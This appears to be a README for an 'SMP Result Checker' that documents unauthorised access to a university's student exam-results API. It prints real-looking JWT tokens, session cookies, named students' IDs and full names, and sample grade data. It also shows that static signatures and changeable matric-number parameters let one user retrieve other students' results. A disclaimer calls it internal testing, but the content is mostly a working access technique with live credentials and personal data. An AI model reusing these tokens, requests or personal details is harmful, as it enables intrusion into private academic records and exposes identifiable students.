# SMP Result Checker

_Last Update: 20/06/2024_

## License

BOMBTIMECS C0. License

Copyright (c) 2024 S.I.F.A.R

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

## Web Application Security Payloads and Bypasses

Feel free to improve with your payloads and techniques! I :heart: pull requests :)

> [!CAUTION]
> Strictly use for internal testing and improving. We do not harm servers or anything.

> [!IMPORTANT]
> ## Reference
> * [JSON Web Signature (JWS)](https://datatracker.ietf.org/doc/html/rfc7515)
> * [Uniform Resource Identifier (URI): Generic Syntax](https://datatracker.ietf.org/doc/html/rfc3986)

### Web URL (Request Method)

```http
POST https://smp.ums.edu.my/api/result/GetResultV2 HTTP/1.1 --> 200 (for success)
```

### Authorisation (JSON)

> **IMPORTANT**
> ## Online Decoder
> * [JWT Decoder](http://calebb.net/)
> * [BASE64 Decoder](https://www.base64decode.org/)

#### JWT Parse

```javascript
function parseJwt (token) {
    var base64Url = token.split('.')[1];
    var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
    var jsonPayload = decodeURIComponent(window.atob(base64).split('').map(function(c) {
        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
    }).join(''));
    return JSON.parse(jsonPayload);
}
```

### Antitempered Signature (Public Key)

```
ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsYVdRaU9pSkNTekU1TVRFd01URTVJaXdpYVhCaFpHUnlJam9pTVRBdU1URTFMamczTGpFd055SXNJbkp2YkdVaU9pSXdNeUlzSW01aVppSTZNVFk0TkRJd09EZzJPU3dpWlhod0lqb3hOamcwTWpFeU5EWTVMQ0pwWVhRaU9qRTJPRFF5TURnNE5qa3NJbWx6Y3lJNkluVnRjeTVsWkhVdWJYa2lMQ0poZFdRaU9pSXFJbjAuNW9WdXUtRGUyOEhHV2E0LXMycTROeTEteU9EdU1FeUFiUTJkaVRfMlc2VQ==
```

Antitempered Signature: 

```
ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsYVdRaU9pSkNVREU1TVRFd01EVTJJaXdpYVhCaFpHUnlJam9pTVRBdU1URTFMamt6TGpFMElpd2ljbTlzWlNJNklqQXpJaXdpYm1KbUlqb3hOamcxTlRreE56SXlMQ0psZUhBaU9qRTJPRFUxT1RVek1qSXNJbWxoZENJNk1UWTROVFU1TVRjeU1pd2lhWE56SWpvaWRXMXpMbVZrZFM1dGVTSXNJbUYxWkNJNklpb2lmUS5ZQmlHa3NfdEduRUhSek1OeUNobzRMOUVVRlNVWGhnUTVJeFhXTHZUSmF3
```

* JWT (Token)/Header

```json
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
{"typ":"JWT","alg":"HS256"}
```

* Claim Set/Payload

```json
eyJVc2VySUQiOiJCSzE5MTEwMTE5IiwiVXNlck5hbWUiOiJBTUlSQSBOQVRBU0hBIFNISVJMSU4gQklOVEkgSkFBRlJFIn0 
{"UserID":"BK19110119","UserName":"AMIRA NATASHA SHIRLIN BINTI JAAFRE"}
```

* Signature (needs to be the same as antitempered signature)

```
WcZi65WDnWfIlFopYu2E4oN3AO_gNNM_A927V-m_OVc
```

* Format

```
[jwt/header].[claim set/payload].[signature]
```

#### Examples

1.
```
-eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySUQiOiJCSzE5MTEwMTE5IiwiVXNlck5hbWUiOiJBTUlSQSBOQVRBU0hBIFNISVJMSU4gQklOVEkgSkFBRlJFIn0.WcZi65WDnWfIlFopYu2E4oN3AO_gNNM_A927V-m_OVc
-eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySUQiOiJCSzE5MTEwMTE5IiwiVXNlck5hbWUiOiJBTUlSQSBOQVRBU0hBIFNISVJMSU4gQklOVEkgSkFBRlJFIn0.WcZi65WDnWfIlFopYu2E4oN3AO_gNNM_A927V-m_OVc
```

The signature is the same and does not change with every login.

2.
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySUQiOiJCUDE5MTEwMDU2IiwiVXNlck5hbWUiOiJOVVIgS0hBSVJVTk5JU0FcdTAwMjcgQklOVEkgU0FaQUxJIn0.inQ1VPeCKEog6010ayG94uQ21_dDaAbn-MbdfDKW04o
{typ: "JWT",alg: "HS256"}.{UserID: "BP19110056",UserName: "NUR KHAIRUNNISA\u0027 BINTI SAZALI"}.[signature]
```

3.
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySUQiOiJCUDE5MTEwMDU2IiwiVXNlck5hbWUiOiJOVVIgS0hBSVJVTk5JU0FcdTAwMjcgQklOVEkgU0FaQUxJIn0.inQ1VPeCKEog6010ayG94uQ21_dDaAbn-MbdfDKW04o
{typ: "JWT",alg: "HS256"}.{UserID: "BP19110056",UserName: "NUR KHAIRUNNISA\u0027 BINTI SAZALI"}.[signature]
```

4.
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySUQiOiJCSzE5MTEwMDk2IiwiVXNlck5hbWUiOiJOVVIgQU1BTkkgQkFMUUlTIEJJTlRJIEFETkFOIn0.R7oaYF4OazAoI1vYriOrLrGY0t5LBcuWDv9Rr0D-pKE
{typ: "JWT",alg: "HS256"}.{UserID: "BK19110096",UserName: "NUR AMANI BALQIS BINTI ADNAN"}.[signature]
```
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.e1VzZXJJRDogIkJLMTkxMTAwOTMiLFVzZXJOYW

1lOiJOT1IgQU1BTkkgQkFMUUlTIEJJTlRJIEFETkFOIi5YmdFNHZbFaMNgoyvXXLM6X_2v4JH3M
{typ: "JWT",alg: "HS256"}.{UserID: "BK19110093",UserName: "NUR AMANI BALQIS BINTI ADNAN"}.[signature]
```

### Cookie

```
dashboard=default; 
SysCulture=en-AU; 
ASP.NET_SessionId=a45zzajkhspz0k5jrc3sqg1o; 
ARRAffinity=5b3f8a12403b9dc2b986729a83bf573dfabff49059ab229ec52134ff3910c818; 
c_jwt_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJVc2VySUQiOiJCSzE5MTEwMTE5IiwiVXNlck5hbWUiOiJBTUlSQSBOQVRBU0hBIFNISVJMSU4gQklOVEkgSkFBRlJFIn0.WcZi65WDnWfIlFopYu2E4oN3AO_gNNM_A927V-m_OVc
```

### Print Button JS Request

#### Web Request

```http
https://smp.ums.edu.my/api/result/PrintResultBMVersion?Nomatrik=BK19110096&KodSesiSem=1-2019/2020&KatPel=02&KodProgram=HA20
```

---

## Data Acquired (JSON)

```json
{
  "isdebt": false,
  "getSesiLatest": "1-2022/2023",
  "result_type": "pra_normal",
  "result": [
    {
      "SMP07_KodMP": "KS30903",
      "SMP17_Gred": "C",
      "SMP17_MNilaian": 2.0,
      "SMP07_NamaBI": "MEASUREMENT AND INSTRUMENTATION",
      "SMP07_Kredit": 3,
      "SMP01_Nomatrik": "BK19110287",
      "KodSesi_Sem": "1-2022/2023",
      "SMP11_Status": "UM1",
      "Nilai": "LULUS"
    },
    {
      "SMP07_KodMP": "KS32503",
      "SMP17_Gred": "C+",
      "SMP17_MNilaian": 2.33,
      "SMP07_NamaBI": "EMBEDDED SYSTEMS",
      "SMP07_Kredit": 3,
      "SMP01_Nomatrik": "BK19110287",
      "KodSesi_Sem": "1-2022/2023",
      "SMP11_Status": "UM1",
      "Nilai": "LULUS"
    }
  ]
}
```

## Testing Site

Use this code in the HTML document file at the suitable place:

```html
<a id="ctl00_cph_SecuredPage_ctrl_SlipPeperiksaanPelajar_btnCetak" class="btn btn-primary" usesubmitbehavior="false" href="javascript:__doPostBack('ctl00$cph_SecuredPage$ctrl_SlipPeperiksaanPelajar$btnCetak','')">Cetak</a>
```

### Testing Links

**Note:** Ensure you are logged in before accessing these links. If you encounter authorization errors, re-login and check the cookies.

```http
https://smp.ums.edu.my/api/result/PrintResultBMVersion?Nomatrik=BK19110097&KodSesiSem=1-2022/2023&KatPel=02&KodProgram=HK20
```

If you see the following error, your session has expired:

```json
{"Message":"[ERR5]: You are not authorized to access the page.Your Session Is expired.Please re-login for further action"}
```

---

> [!WARNING]

> Ensure that students and staff change their passwords regularly to avoid misuse. There has been a data leak affecting over 58K records due to misuse or misleading port configurations.

---

## References

* [JSON Web Signature (JWS)](https://datatracker.ietf.org/doc/html/rfc7515)
* [Uniform Resource Identifier (URI): Generic Syntax](https://datatracker.ietf.org/doc/html/rfc3986)
* [JWT Decoder](http://calebb.net/)
* [BASE64 Decoder](https://www.base64decode.org/)
